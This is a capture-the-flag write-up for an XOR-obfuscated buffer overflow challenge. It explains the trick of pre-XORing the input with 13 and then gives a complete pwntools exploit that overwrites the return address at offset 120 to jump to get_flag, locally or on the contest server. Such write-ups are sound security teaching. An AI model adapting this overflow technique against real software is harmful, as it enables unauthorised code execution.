# XOR
* **Event:** RobotApocalypseCTF (ISSS CTF 01-29-2021)
* **Problem Type:** Binary Exploitation

The binary is vulnerable to a standard buffer overflow, but it also xor's all input by 13. Since xor is reversible (i.e.
`a ^ b ^ b = a`) we can just xor our input by 13 to start with. Then, when the binary xors it by 13 again it will cancel
out and we will get our original payload. Besides that it's just a standard buffer overflow (check the writeups for
foreverCTF if you want more details on how to solve those)

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/xor'

e = ELF('./build/xor')
rop = ROP('./build/xor')
if 'd' in sys.argv:
    p = gdb.debug('./build/xor')
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5000)
else:
    p = process('./build/xor')

#payload = bytearray(cyclic(150))
payload = bytearray(flat({120: e.sym['get_flag']}))

for i in range(len(payload)):
    payload[i] ^= 13

p.recvline()
p.recvline()
p.sendline('150')
p.recvline()
p.sendline(bytes(payload))
p.recvline()
p.recvline()
p.interactive()
```
